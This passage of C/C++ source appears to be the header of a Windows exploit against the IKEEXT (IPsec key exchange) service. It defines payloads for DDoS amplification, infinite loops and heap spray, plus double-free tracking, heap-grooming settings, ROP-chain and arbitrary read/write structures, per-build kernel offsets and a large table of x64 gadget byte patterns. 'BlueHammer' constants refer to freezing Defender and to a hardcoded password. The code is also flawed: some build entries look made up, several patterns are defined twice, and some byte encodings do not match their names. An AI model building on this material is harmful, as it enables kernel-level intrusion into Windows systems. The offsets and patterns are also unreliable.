} IKE_DDOS_AMPLIFIER_PAYLOAD;

typedef struct {
    uint8_t next_payload;
    uint8_t critical;
    uint16_t length;
    uint32_t loop_counter;
    uint32_t loop_condition;
    uint8_t loop_code[32];      // ✅ 32 octets pour le code de boucle infinie
} IKE_DDOS_LOOP_PAYLOAD;

typedef struct {
    uint8_t next_payload;
    uint8_t critical;
    uint16_t length;
    uint32_t allocation_size;
    uint32_t allocation_count;
    uint8_t heap_spray_data[64]; // ✅ 64 octets pour le heap spray
} IKE_DDOS_MEMORY_PAYLOAD;

#pragma pack(pop)

typedef struct _IKE_HEADER {
    uint8_t init_spi[8];
    uint8_t resp_spi[8];
    uint8_t next_payload;
    uint8_t version_major;
    uint8_t version_minor;
    uint8_t exchange_type;
    uint8_t flags;
    uint32_t message_id;
    uint32_t length;
} IKE_HEADER;

typedef struct _IKE_SA_PAYLOAD {
    uint8_t next_payload;
    uint8_t critical;
    uint16_t length;
    uint8_t num_proposals;
} IKE_SA_PAYLOAD;

typedef struct _IKE_PROPOSAL_PAYLOAD {
    uint8_t next_payload;
    uint8_t critical;
    uint16_t length;
    uint8_t proposal_num;
    uint8_t proto_id;
    uint8_t spi_size;
    uint8_t num_transforms;
} IKE_PROPOSAL_PAYLOAD;

// Structure corrigée selon RFC 4306 Section 3.3.2
typedef struct _IKE_TRANSFORM_PAYLOAD {
    uint8_t next_payload;    // Next Payload (1 octet)
    uint8_t reserved1;       // Réservé (1 octet) - RFC 4306
    uint16_t length;         // Longueur totale (2 octets)
    uint8_t transform_type;   // Type de transform (1 octet)
    uint8_t reserved2;       // Réservé (1 octet) - RFC 4306
    uint16_t transform_id;    // Identifiant du transform (2 octets)
} IKE_TRANSFORM_PAYLOAD;

typedef struct _IKE_NONCE_PAYLOAD {
    uint8_t next_payload;
    uint8_t critical;
    uint16_t length;
    uint8_t nonce_data[DEFAULT_NONCE_SIZE];
} IKE_NONCE_PAYLOAD;

typedef struct _IKE_KEY_EXCHANGE_PAYLOAD {
    uint8_t next_payload;
    uint8_t critical;
    uint16_t length;
    uint16_t dh_group;
    uint8_t reserved;
    uint8_t key_exchange_data[DEFAULT_DH_SIZE];
} IKE_KEY_EXCHANGE_PAYLOAD;

typedef struct _IKE_NOTIFY_PAYLOAD {
    uint8_t next_payload;
    uint8_t critical;
    uint16_t length;
    uint8_t proto_id;
    uint8_t spi_size;
    uint16_t notify_type;
} IKE_NOTIFY_PAYLOAD;

typedef struct _IKE_VENDOR_ID_PAYLOAD {
    uint8_t next_payload;
    uint8_t critical;
    uint16_t length;
    uint32_t vendor_id;
} IKE_VENDOR_ID_PAYLOAD;

typedef struct _IKE_SKF_FRAGMENT_PAYLOAD {
    uint8_t next_payload;
    uint8_t critical;
    uint16_t length;
    uint8_t fragment_type;
    uint16_t vendor_id;
    uint16_t fragment_id;
    uint16_t total_fragments;
    uint16_t fragment_offset;
} IKE_SKF_FRAGMENT_PAYLOAD;

typedef struct _EXPLOIT_CONTEXT {
    uint64_t ntoskrnl_base;
    uint64_t kernel32_base;
    uint64_t ikeext_base;
    uint64_t heap_base;
    uint64_t stack_base;
    uint64_t shellcode_addr;
} EXPLOIT_CONTEXT;

typedef struct _EXPLOIT_STATS {
    uint64_t packets_sent;
    uint64_t double_free_attempts;
    uint64_t leaks_success;
    uint64_t errors;
    uint64_t success_count;
    uint64_t total_time_ms;
} EXPLOIT_STATS;

typedef struct _DEBUG_INFO {
    char last_error_msg[256];
    char last_success_msg[256];
    uint32_t error_count;
    uint32_t success_count;
    uint64_t last_error_time;
} DEBUG_INFO;

typedef struct _MEMORY_INFO {
    uint64_t ntdll_base;
    uint64_t kernel32_base;
    uint64_t kernel_base;
    uint64_t ikeext_base;
    uint64_t system_eprocess;
    uint64_t heap_base;
    uint64_t stack_base;
} MEMORY_INFO;

typedef struct _HEAP_GROOM_CONTEXT {
    HANDLE heap_handle;
    uint64_t target_address;
    int thread_count;
    HANDLE* threads;
    volatile LONG stop_flag;
    uint32_t allocated_chunks;
} HEAP_GROOM_CONTEXT;

typedef struct _ROP_CHAIN {
    uint64_t pop_rax;
    uint64_t pop_rcx;
    uint64_t pop_rdx;
    uint64_t pop_r8;
    uint64_t pop_r9;
    uint64_t pop_rsp;
    uint64_t mov_rax_rsp;
    uint64_t mov_rcx_rsp;
    uint64_t mov_rcx_rax;
    uint64_t mov_rax_rcx;
    uint64_t mov_rcx_rdx;
    uint64_t xor_rax;
    uint64_t xor_rcx;
    uint64_t xor_rdx;
    uint64_t jmp_rsp;
    uint64_t call_rax;
    uint64_t ret;
    uint64_t virtual_protect;
    uint64_t disable_cfg;
    uint64_t disable_cet;
    uint64_t add_rsp;
    uint64_t sub_rsp;
    uint64_t ntdll_base;
    uint64_t kernel32_base;
    uint64_t ikeext_base;
    uint64_t heap_base;
    uint64_t stack_base;
    uint64_t shellcode_addr;
    uint64_t rop_chain[MAX_ROP_CHAIN_SIZE];
    size_t length;
} ROP_CHAIN;

typedef struct _KERNEL_OFFSETS {
    uint32_t build_number;
    const char* os_version;
    uint64_t offset1;
    uint64_t offset2;
    uint64_t offset3;
    uint64_t offset4;
    uint64_t offset5;
} KERNEL_OFFSETS;

typedef struct _ROP_GADGET {
    uint64_t address;
    const char* name;
    ROP_GADGET_TYPE type;
    uint8_t validated;
    uint8_t required;
    uint64_t module_base;
} ROP_GADGET;

typedef struct _MODULE_DATA {
    uint64_t base;
    size_t size;
    HMODULE handle;
    char name[256];
    uint8_t* dump;
} MODULE_DATA;

typedef struct _ARBITRARY_RW_PRIMITIVE {
    uint64_t read_func;
    uint64_t write_func;
    uint64_t target_addr;
    uint8_t* buffer;
    size_t buffer_size;
} ARBITRARY_RW_PRIMITIVE;

typedef struct _SUSPICIOUS_REGION {
    PVOID address;
    SIZE_T size;
    DWORD protection;
    double entropy;
    std::wstring patternDetected;
    std::wstring criticality;
} SUSPICIOUS_REGION;

typedef struct _HEAP_GROOM_THREAD_PARAMS {
    HANDLE heap;
    size_t base_chunk_size;
    uint32_t iterations;
    uint32_t thread_id;
    volatile LONG* stop_flag;
    uint64_t target_address;
    uint32_t allocated_chunks;
    uint8_t use_nt_allocate;
    SRWLOCK lock;
} HEAP_GROOM_THREAD_PARAMS;

typedef struct _GROOM_CONFIG {
    int thread_count;
    int iterations;
    int delay_ms;
    size_t chunk_size;
    int min_free_pct;
    int max_free_pct;
} GROOM_CONFIG;

static const KERNEL_OFFSETS g_OffsetTable[] = {
    {19041, "Windows 10 1909", 0x358, 0x5E8, 0x2E8, 0x440, 0x3F8},
    {19042, "Windows 10 20H2", 0x358, 0x5E8, 0x2E8, 0x440, 0x3F8},
    {19043, "Windows 10 21H1", 0x358, 0x5E8, 0x2E8, 0x440, 0x3F8},
    {19044, "Windows 10 21H2", 0x358, 0x5E8, 0x2E8, 0x440, 0x3F8},
    {19045, "Windows 10 22H2", 0x358, 0x5E8, 0x2E8, 0x440, 0x3F8},
    {22000, "Windows 11 21H2", 0x358, 0x5E8, 0x2F0, 0x448, 0x400},
    {22621, "Windows 11 22H2", 0x358, 0x5E8, 0x2F0, 0x448, 0x400},
    {22622, "Windows 11 22H2 (Moment 1)", 0x358, 0x5E8, 0x2F0, 0x448, 0x400},
    {22623, "Windows 11 22H2 (Moment 2)", 0x358, 0x5E8, 0x2F0, 0x448, 0x400},
    {22624, "Windows 11 22H2 (Moment 3)", 0x358, 0x5E8, 0x2F0, 0x448, 0x400},
    {22625, "Windows 11 22H2 (Moment 4)", 0x358, 0x5E8, 0x2F0, 0x448, 0x400},
    {22626, "Windows 11 22H2 (Moment 5)", 0x358, 0x5E8, 0x2F0, 0x448, 0x400},
    {22631, "Windows 11 23H2", 0x368, 0x5F0, 0x2F0, 0x448, 0x400},
    {22632, "Windows 11 23H2 (Moment 1)", 0x368, 0x5F0, 0x2F0, 0x448, 0x400},
    {22633, "Windows 11 23H2 (Moment 2)", 0x368, 0x5F0, 0x2F0, 0x448, 0x400},
    {22634, "Windows 11 23H2 (Moment 3)", 0x368, 0x5F0, 0x2F0, 0x448, 0x400},
    {22635, "Windows 11 23H2 (Moment 4)", 0x368, 0x5F0, 0x2F0, 0x448, 0x400},
    {22636, "Windows 11 23H2 (Moment 5)", 0x368, 0x5F0, 0x2F0, 0x448, 0x400},
    {22641, "Windows 11 24H2", 0x368, 0x5F0, 0x2F8, 0x450, 0x408},
    {22642, "Windows 11 24H2 (Moment 1)", 0x368, 0x5F0, 0x2F8, 0x450, 0x408},
    {22643, "Windows 11 24H2 (Moment 2)", 0x368, 0x5F0, 0x2F8, 0x450, 0x408},
    {22644, "Windows 11 24H2 (Moment 3)", 0x368, 0x5F0, 0x2F8, 0x450, 0x408},
    {22645, "Windows 11 24H2 (Moment 4)", 0x368, 0x5F0, 0x2F8, 0x450, 0x408},
    {22646, "Windows 11 24H2 (Moment 5)", 0x368, 0x5F0, 0x2F8, 0x450, 0x408},
    {26100, "Windows 11 25H2", 0x370, 0x5F8, 0x300, 0x458, 0x410},
    {26101, "Windows 11 25H2 (Moment 1)", 0x370, 0x5F8, 0x300, 0x458, 0x410},
    {26102, "Windows 11 25H2 (Moment 2)", 0x370, 0x5F8, 0x300, 0x458, 0x410},
    {26103, "Windows 11 25H2 (Moment 3)", 0x370, 0x5F8, 0x300, 0x458, 0x410},
    {26104, "Windows 11 25H2 (Moment 4)", 0x370, 0x5F8, 0x300, 0x458, 0x410},
    {26105, "Windows 11 25H2 (Moment 5)", 0x370, 0x5F8, 0x300, 0x458, 0x410},
    {0, "Unknown", 0, 0, 0, 0, 0}
};

// =============================================
// CONSTANTES DE BLUEHAMMER (COPIÉES DEPUIS main.cpp)
// =============================================
static const WCHAR EICAR_DROP_PATH[] = L"C:\\ProgramData\\eicar_test.com";
static const WCHAR SYNC_ROOT_PATH[] = L"C:\\ProgramData\\BlueHammer_SyncRoot";
static const WCHAR TEMP_PASSWORD[] = L"Blu3H@mm3r!Tmp99";
static const DWORD VSS_TIMEOUT_MS = 60000;    // 60 secondes pour la création du snapshot VSS
static const DWORD FREEZE_TIMEOUT_MS = 30000;  // 30 secondes pour le freeze de Defender
static const DWORD MAX_RETRIES = 3;
static const DWORD HEAP_GROOM_THREADS = 8;
static const DWORD DEFAULT_CHUNK_SIZE = 0x10000;

static const uint8_t g_pattern_pop_rax[] = {0x58, 0xC3};
static const uint8_t g_pattern_pop_rcx[] = {0x59, 0xC3};
static const uint8_t g_pattern_pop_rdx[] = {0x5A, 0xC3};
static const uint8_t g_pattern_pop_rbx[] = {0x5B, 0xC3};
static const uint8_t g_pattern_pop_rsp[] = {0x5C, 0xC3};
static const uint8_t g_pattern_pop_rbp[] = {0x5D, 0xC3};
static const uint8_t g_pattern_pop_rsi[] = {0x5E, 0xC3};
static const uint8_t g_pattern_pop_rdi[] = {0x5F, 0xC3};
static const uint8_t g_pattern_pop_r8[] = {0x41, 0x58, 0xC3};
static const uint8_t g_pattern_pop_r9[] = {0x41, 0x59, 0xC3};
static const uint8_t g_pattern_pop_r10[] = {0x41, 0x5A, 0xC3};
static const uint8_t g_pattern_pop_r11[] = {0x41, 0x5B, 0xC3};
static const uint8_t g_pattern_pop_r12[] = {0x41, 0x5C, 0xC3};
static const uint8_t g_pattern_pop_r13[] = {0x41, 0x5D, 0xC3};
static const uint8_t g_pattern_pop_r14[] = {0x41, 0x5E, 0xC3};
static const uint8_t g_pattern_pop_r15[] = {0x41, 0x5F, 0xC3};
static const uint8_t g_pattern_mov_rax_rsp[] = {0x48, 0x89, 0xE0, 0xC3};
static const uint8_t g_pattern_mov_rcx_rsp[] = {0x48, 0x89, 0xE1, 0xC3};
static const uint8_t g_pattern_mov_rcx_rax[] = {0x48, 0x89, 0x01, 0xC3};
static const uint8_t g_pattern_mov_rax_rcx[] = {0x48, 0x8B, 0x01, 0xC3};
static const uint8_t g_pattern_mov_rcx_rdx[] = {0x48, 0x89, 0xD1, 0xC3};
static const uint8_t g_pattern_mov_rdx_rax[] = {0x48, 0x89, 0xC2, 0xC3};
static const uint8_t g_pattern_mov_rax_rcx_2[] = {0x48, 0x89, 0xC8, 0xC3};
static const uint8_t g_pattern_xor_rax[] = {0x48, 0x31, 0xC0, 0xC3};
static const uint8_t g_pattern_xor_rcx[] = {0x48, 0x31, 0xC9, 0xC3};
static const uint8_t g_pattern_xor_rdx[] = {0x48, 0x31, 0xD2, 0xC3};
static const uint8_t g_pattern_xor_rax_rdx[] = {0x48, 0x31, 0xC0, 0x48, 0x31, 0xD2, 0xC3};
static const uint8_t g_pattern_inc_rax[] = {0x48, 0xFF, 0xC0, 0xC3};
static const uint8_t g_pattern_dec_rax[] = {0x48, 0xFF, 0xC8, 0xC3};
static const uint8_t g_pattern_inc_rcx[] = {0x48, 0xFF, 0xC1, 0xC3};
static const uint8_t g_pattern_dec_rcx[] = {0x48, 0xFF, 0xC9, 0xC3};
static const uint8_t g_pattern_add_rax_8[] = {0x48, 0x83, 0xC0, 0x08, 0xC3};
static const uint8_t g_pattern_sub_rax_8[] = {0x48, 0x83, 0xE8, 0x08, 0xC3};
static const uint8_t g_pattern_jmp_rsp[] = {0xFF, 0xE4};
static const uint8_t g_pattern_call_rax[] = {0xFF, 0xD0, 0xC3};
static const uint8_t g_pattern_ret[] = {0xC3};
static const uint8_t g_pattern_ret_ret[] = {0xC3, 0xC3};
static const uint8_t g_pattern_push_rax_ret[] = {0x50, 0xC3};
static const uint8_t g_pattern_push_rcx_ret[] = {0x51, 0xC3};
static const uint8_t g_pattern_push_rdx_ret[] = {0x52, 0xC3};
static const uint8_t g_pattern_virtual_protect[] = {0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x48, 0x89, 0x7C, 0x24, 0x18, 0x48};
static const uint8_t g_pattern_virtual_protect_call[] = {0x48, 0x8B, 0x41, 0x10, 0x48, 0x8B, 0xC8, 0xFF, 0xD0, 0xC3};
static const uint8_t g_pattern_mov_gs_60_rax[] = {0x65, 0x48, 0x89, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0xC3};
static const uint8_t g_pattern_mov_rax_gs_60[] = {0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0xC3};
static const uint8_t g_pattern_mov_rip_rax[] = {0x48, 0x89, 0x05, 0x00, 0x00, 0x00, 0x00, 0xC3};
static const uint8_t g_pattern_mov_rax_rip[] = {0x48, 0x8B, 0x05, 0x00, 0x00, 0x00, 0x00, 0xC3};
static const uint8_t g_pattern_jmp_rax_plus_58[] = {0xFF, 0x60, 0x58, 0xC3};
static const uint8_t g_pattern_lea_rax_rip_jmp[] = {0x48, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0};
static const uint8_t g_pattern_lea_rcx_rip_jmp[] = {0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE1};
static const uint8_t g_pattern_not_eax[] = {0xF7, 0xD0, 0xC3};
static const uint8_t g_pattern_not_ecx[] = {0xF7, 0xD1, 0xC3};
static const uint8_t g_pattern_add_rsp_28[] = {0x48, 0x83, 0xC4, 0x28, 0xC3};
static const uint8_t g_pattern_add_rsp_20[] = {0x48, 0x83, 0xC4, 0x20, 0xC3};
static const uint8_t g_pattern_add_rsp_18[] = {0x48, 0x83, 0xC4, 0x18, 0xC3};
static const uint8_t g_pattern_add_rsp_10[] = {0x48, 0x83, 0xC4, 0x10, 0xC3};
static const uint8_t g_pattern_add_rsp_08[] = {0x48, 0x83, 0xC4, 0x08, 0xC3};
static const uint8_t g_pattern_sub_rsp_28[] = {0x48, 0x83, 0xEC, 0x28, 0xC3};
static const uint8_t g_pattern_sub_rsp_20[] = {0x48, 0x83, 0xEC, 0x20, 0xC3};
static const uint8_t g_pattern_sub_rsp_18[] = {0x48, 0x83, 0xEC, 0x18, 0xC3};
static const uint8_t g_pattern_sub_rsp_10[] = {0x48, 0x83, 0xEC, 0x10, 0xC3};
static const uint8_t g_pattern_sub_rsp_08[] = {0x48, 0x83, 0xEC, 0x08, 0xC3};
static const uint8_t g_pattern_mov_rsi_rax[] = {0x48, 0x89, 0x06, 0xC3};
static const uint8_t g_pattern_mov_rsi_rbx[] = {0x48, 0x89, 0x1E, 0xC3};
static const uint8_t g_pattern_or_rsi_1[] = {0x48, 0x83, 0x0E, 0x01, 0xC3};
static const uint8_t g_pattern_mov_rdi_rax[] = {0x48, 0x89, 0x07, 0xC3};
static const uint8_t g_pattern_mov_rdi_rbx[] = {0x48, 0x89, 0x1F, 0xC3};
static const uint8_t g_pattern_or_rdi_1[] = {0x48, 0x83, 0x0F, 0x01, 0xC3};
static const uint8_t g_pattern_mov_r8_rax[] = {0x49, 0x89, 0xC0, 0xC3};
static const uint8_t g_pattern_mov_r9_rcx[] = {0x49, 0x89, 0xC1, 0xC3};
static const uint8_t g_pattern_mov_r10_rax[] = {0x49, 0x89, 0xC2, 0xC3};
static const uint8_t g_pattern_mov_r11_rax[] = {0x49, 0x89, 0xC3, 0xC3};
static const uint8_t g_pattern_or_rax_rax[] = {0x48, 0x09, 0xC0, 0xC3};
static const uint8_t g_pattern_or_rcx_rcx[] = {0x48, 0x09, 0xC9, 0xC3};
static const uint8_t g_pattern_sub_rax_rax[] = {0x48, 0x29, 0xC0, 0xC3};
static const uint8_t g_pattern_sub_rcx_rcx[] = {0x48, 0x29, 0xC9, 0xC3};
static const uint8_t g_pattern_je_1[] = {0x74, 0x01, 0xC3};
static const uint8_t g_pattern_jne_1[] = {0x75, 0x01, 0xC3};
static const uint8_t g_pattern_jc_1[] = {0x72, 0x01, 0xC3};
static const uint8_t g_pattern_jnc_1[] = {0x73, 0x01, 0xC3};
static const uint8_t g_pattern_syscall_ret[] = {0x0F, 0x05, 0xC3};
static const uint8_t g_pattern_syscall[] = {0x0F, 0x05};
static const uint8_t g_pattern_pushfq[] = {0x9C, 0xC3};
static const uint8_t g_pattern_popfq[] = {0x9D, 0xC3};
static const uint8_t g_pattern_clc[] = {0xF8, 0xC3};
static const uint8_t g_pattern_stc[] = {0xF9, 0xC3};
static const uint8_t g_pattern_lea_rax_rip[] = {0x48, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00, 0xC3};
static const uint8_t g_pattern_lea_rbx_rip[] = {0x48, 0x8D, 0x1D, 0x00, 0x00, 0x00, 0x00, 0xC3};
static const uint8_t g_pattern_lea_rcx_rip[] = {0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00, 0xC3};
static const uint8_t g_pattern_lea_rdx_rip[] = {0x48, 0x8D, 0x15, 0x00, 0x00, 0x00, 0x00, 0xC3};
static const uint8_t g_pattern_add_rax_rax[] = {0x48, 0x01, 0xC0, 0xC3};
static const uint8_t g_pattern_sub_rax_rax[] = {0x48, 0x29, 0xC0, 0xC3};
static const uint8_t g_pattern_add_rcx_rcx[] = {0x48, 0x01, 0xC9, 0xC3};
static const uint8_t g_pattern_sub_rcx_rcx[] = {0x48, 0x29, 0xC9, 0xC3};
static const uint8_t g_pattern_add_rax_rdx[] = {0x48, 0x01, 0xD0, 0xC3};
static const uint8_t g_pattern_sub_rax_rdx[] = {0x48, 0x29, 0xD0, 0xC3};
static const uint8_t g_pattern_shl_rax_8[] = {0x48, 0xC1, 0xE0, 0x08, 0xC3};
static const uint8_t g_pattern_shr_rax_8[] = {0x48, 0xC1, 0xE8, 0x08, 0xC3};
static const uint8_t g_pattern_shl_rax_16[] = {0x48, 0xC1, 0xE0, 0x10, 0xC3};
static const uint8_t g_pattern_shr_rax_16[] = {0x48, 0xC1, 0xE8, 0x10, 0xC3};
static const uint8_t g_pattern_rol_rax_8[] = {0x48, 0xC1, 0xC0, 0x08, 0xC3};
static const uint8_t g_pattern_ror_rax_8[] = {0x48, 0xC1, 0xC8, 0x08, 0xC3};
static const uint8_t g_pattern_and_rax_f0[] = {0x48, 0x83, 0xE0, 0xF0, 0xC3};
static const uint8_t g_pattern_or_rax_f0[] = {0x48, 0x83, 0xC8, 0xF0, 0xC3};
static const uint8_t g_pattern_xor_rax_f0[] = {0x48, 0x83, 0xF0, 0xF0, 0xC3};
static const uint8_t g_pattern_cmp_rax_rax[] = {0x48, 0x39, 0xC0, 0xC3};
static const uint8_t g_pattern_cmp_rax_rcx[] = {0x48, 0x39, 0xC1, 0xC3};
static const uint8_t g_pattern_cmp_rax_rdx[] = {0x48, 0x39, 0xD0, 0xC3};
static const uint8_t g_pattern_test_rax_rax[] = {0x48, 0x85, 0xC0, 0xC3};
static const uint8_t g_pattern_test_rcx_rcx[] = {0x48, 0x85, 0xC9, 0xC3};
static const uint8_t g_pattern_test_rdx_rdx[] = {0x48, 0x85, 0xD2, 0xC3};
static const uint8_t g_pattern_mov_rax_0[] = {0x48, 0xC7, 0xC0, 0x00, 0x00, 0x00, 0x00, 0xC3};
static const uint8_t g_pattern_mov_rcx_0[] = {0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, 0xC3};
static const uint8_t g_pattern_mov_rdx_0[] = {0x48, 0xC7, 0xC2, 0x00, 0x00, 0x00, 0x00, 0xC3};
static const uint8_t g_pattern_jmp_rax[] = {0xFF, 0x20};
static const uint8_t g_pattern_jmp_rcx[] = {0xFF, 0x21};
static const uint8_t g_pattern_jmp_rdx[] = {0xFF, 0x22};
static const uint8_t g_pattern_jmp_rax_8[] = {0xFF, 0x60, 0x08};
static const uint8_t g_pattern_jmp_rcx_8[] = {0xFF, 0x61, 0x08};
static const uint8_t g_pattern_call_rax_ind[] = {0xFF, 0x10};
static const uint8_t g_pattern_call_rcx_ind[] = {0xFF, 0x11};
static const uint8_t g_pattern_call_rdx_ind[] = {0xFF, 0x12};
static const uint8_t g_pattern_pop_rax_rcx[] = {0x58, 0x59, 0xC3};
static const uint8_t g_pattern_pop_rax_rdx[] = {0x58, 0x5A, 0xC3};
static const uint8_t g_pattern_pop_rcx_rdx[] = {0x59, 0x5A, 0xC3};
static const uint8_t g_pattern_pop_rax_rcx_rdx[] = {0x58, 0x59, 0x5A, 0xC3};
static const uint8_t g_pattern_pop_r8_r9[] = {0x41, 0x58, 0x41, 0x59, 0xC3};
static const uint8_t g_pattern_pop_r8_r10[] = {0x41, 0x58, 0x41, 0x5A, 0xC3};
static const uint8_t g_pattern_pop_r9_r10[] = {0x41, 0x59, 0x41, 0x5A, 0xC3};
static const uint8_t g_pattern_push_r8[] = {0x41, 0x50, 0xC3};
static const uint8_t g_pattern_push_r9[] = {0x41, 0x51, 0xC3};
static const uint8_t g_pattern_push_r10[] = {0x41, 0x52, 0xC3};
static const uint8_t g_pattern_push_r11[] = {0x41, 0x53, 0xC3};
static const uint8_t g_pattern_mov_r8_rax_mem[] = {0x49, 0x89, 0x00, 0xC3};
static const uint8_t g_pattern_mov_r9_rax_mem[] = {0x49, 0x89, 0x01, 0xC3};
static const uint8_t g_pattern_mov_rax_r8_mem[] = {0x49, 0x8B, 0x00, 0xC3};
static const uint8_t g_pattern_mov_rax_r9_mem[] = {0x49, 0x8B, 0x01, 0xC3};
static const uint8_t g_pattern_mov_r8_rcx_mem[] = {0x49, 0x89, 0x08, 0xC3};
static const uint8_t g_pattern_mov_r9_rcx_mem[] = {0x49, 0x89, 0x09, 0xC3};
static const uint8_t g_pattern_add_r8_r8[] = {0x4D, 0x01, 0xC0, 0xC3};
static const uint8_t g_pattern_add_r9_r9[] = {0x4D, 0x01, 0xC9, 0xC3};
static const uint8_t g_pattern_sub_r8_r8[] = {0x4D, 0x29, 0xC0, 0xC3};
static const uint8_t g_pattern_sub_r9_r9[] = {0x4D, 0x29, 0xC9, 0xC3};
static const uint8_t g_pattern_add_r8_r10[] = {0x4D, 0x01, 0xC2, 0xC3};
static const uint8_t g_pattern_sub_r8_r10[] = {0x4D, 0x29, 0xC2, 0xC3};
static const uint8_t g_pattern_or_r8_r8[] = {0x4D, 0x09, 0xC0, 0xC3};
static const uint8_t g_pattern_or_r9_r9[] = {0x4D, 0x09, 0xC9, 0xC3};
static const uint8_t g_pattern_xor_r8_r8[] = {0x4D, 0x31, 0xC0, 0xC3};
static const uint8_t g_pattern_xor_r9_r9[] = {0x4D, 0x31, 0xC9, 0xC3};
static const uint8_t g_pattern_xor_r10_r10[] = {0x4D, 0x31, 0xD2, 0xC3};
static const uint8_t g_pattern_shl_r8_8[] = {0x49, 0xC1, 0xE0, 0x08, 0xC3};
static const uint8_t g_pattern_shr_r8_8[] = {0x49, 0xC1, 0xE8, 0x08, 0xC3};
static const uint8_t g_pattern_shl_r9_16[] = {0x49, 0xC1, 0xE1, 0x10, 0xC3};
static const uint8_t g_pattern_shr_r9_16[] = {0x49, 0xC1, 0xE9, 0x10, 0xC3};
static const uint8_t g_pattern_rol_r8_8[] = {0x49, 0xC1, 0xC0, 0x08, 0xC3};
static const uint8_t g_pattern_ror_r8_8[] = {0x49, 0xC1, 0xC8, 0x08, 0xC3};
static const uint8_t g_pattern_cmp_r8_r8[] = {0x4D, 0x39, 0xC0, 0xC3};
static const uint8_t g_pattern_cmp_r8_r9[] = {0x4D, 0x39, 0xC1, 0xC3};
static const uint8_t g_pattern_cmp_r8_r10[] = {0x4D, 0x39, 0xD0, 0xC3};
static const uint8_t g_pattern_test_r8_r8[] = {0x4D, 0x85, 0xC0, 0xC3};
static const uint8_t g_pattern_test_r9_r9[] = {0x4D, 0x85, 0xC9, 0xC3};
static const uint8_t g_pattern_test_r10_r10[] = {0x4D, 0x85, 0xD2, 0xC3};
static const uint8_t g_pattern_mov_r8_0[] = {0x49, 0xC7, 0xC0, 0x00, 0x00, 0x00, 0x00, 0xC3};
static const uint8_t g_pattern_mov_r9_0[] = {0x49, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, 0xC3};
static const uint8_t g_pattern_mov_r10_0[] = {0x49, 0xC7, 0xC2, 0x00, 0x00, 0x00, 0x00, 0xC3};
static const uint8_t g_pattern_mov_r8_ffffffff[] = {0x49, 0xC7, 0xC0, 0xFF, 0xFF, 0xFF, 0xFF, 0xC3};
static const uint8_t g_pattern_mov_r9_ffffffff[] = {0x49, 0xC7, 0xC1, 0xFF, 0xFF, 0xFF, 0xFF, 0xC3};
static const uint8_t g_pattern_jmp_r8[] = {0x41, 0xFF, 0xE0};
static const uint8_t g_pattern_jmp_r9[] = {0x41, 0xFF, 0xE1};
static const uint8_t g_pattern_jmp_r10[] = {0x41, 0xFF, 0xE2};
static const uint8_t g_pattern_call_r8[] = {0x41, 0xFF, 0xD0};
static const uint8_t g_pattern_call_r9[] = {0x41, 0xFF, 0xD1};
static const uint8_t g_pattern_call_r10[] = {0x41, 0xFF, 0xD2};
static const uint8_t g_pattern_jmp_r8_mem[] = {0x41, 0xFF, 0x20};
static const uint8_t g_pattern_jmp_r9_mem[] = {0x41, 0xFF, 0x21};
static const uint8_t g_pattern_jmp_r10_mem[] = {0x41, 0xFF, 0x22};
static const uint8_t g_pattern_call_r8_mem[] = {0x41, 0xFF, 0x10};
static const uint8_t g_pattern_call_r9_mem[] = {0x41, 0xFF, 0x11};
static const uint8_t g_pattern_call_r10_mem[] = {0x41, 0xFF, 0x12};
static const uint8_t g_pattern_push_r8_r9[] = {0x41, 0x50, 0x41, 0x51, 0xC3};
static const uint8_t g_pattern_push_r8_r10[] = {0x41, 0x50, 0x41, 0x52, 0xC3};
static const uint8_t g_pattern_push_r9_r10[] = {0x41, 0x51, 0x41, 0x52, 0xC3};
static const uint8_t g_pattern_pop_r8_r9[] = {0x41, 0x58, 0x41, 0x59, 0xC3};
static const uint8_t g_pattern_pop_r8_r10[] = {0x41, 0x58, 0x41, 0x5A, 0xC3};
static const uint8_t g_pattern_pop_r9_r10[] = {0x41, 0x59, 0x41, 0x5A, 0xC3};
static const uint8_t g_pattern_pop_r10_r11[] = {0x41, 0x5A, 0x41, 0x5B, 0xC3};
static const uint8_t g_pattern_pop_r11_r12[] = {0x41, 0x5B, 0x41, 0x5C, 0xC3};
static const uint8_t g_pattern_pop_r12_r13[] = {0x41, 0x5C, 0x41, 0x5D, 0xC3};
static const uint8_t g_pattern_pop_r13_r14[] = {0x41, 0x5D, 0x41, 0x5E, 0xC3};
static const uint8_t g_pattern_pop_r14_r15[] = {0x41, 0x5E, 0x41, 0x5F, 0xC3};
static const uint8_t g_pattern_mov_rcx_20_rax[] = {0x48, 0x89, 0x41, 0x20, 0xC3};
static const uint8_t g_pattern_mov_rcx_28_rax[] = {0x48, 0x89, 0x41, 0x28, 0xC3};
static const uint8_t g_pattern_mov_rcx_30_rax[] = {0x48, 0x89, 0x41, 0x30, 0xC3};
static const uint8_t g_pattern_mov_rax_rcx_20[] = {0x48, 0x8B, 0x41, 0x20, 0xC3};
static const uint8_t g_pattern_mov_rax_rcx_28[] = {0x48, 0x8B, 0x41, 0x28, 0xC3};
static const uint8_t g_pattern_mov_rax_rcx_30[] = {0x48, 0x8B, 0x41, 0x30, 0xC3};
static const uint8_t g_pattern_mov_rcx_A0_rax[] = {0x48, 0x89, 0x81, 0xA0, 0x00, 0x00, 0x00, 0xC3};
static const uint8_t g_pattern_mov_rax_rcx_A0[] = {0x48, 0x8B, 0x81, 0xA0, 0x00, 0x00, 0x00, 0xC3};
static const uint8_t g_pattern_mov_rcx_E0_rax[] = {0x48, 0x89, 0x81, 0xE0, 0x00, 0x00, 0x00, 0xC3};
static const uint8_t g_pattern_mov_rax_rcx_E0[] = {0x48, 0x8B, 0x81, 0xE0, 0x00, 0x00, 0x00, 0xC3};
static const uint8_t g_pattern_mov_r8_A0_rax[] = {0x49, 0x89, 0x80, 0xA0, 0x00, 0x00, 0x00, 0xC3};
static const uint8_t g_pattern_mov_rax_r8_A0[] = {0x49, 0x8B, 0x80, 0xA0, 0x00, 0x00, 0x00, 0xC3};
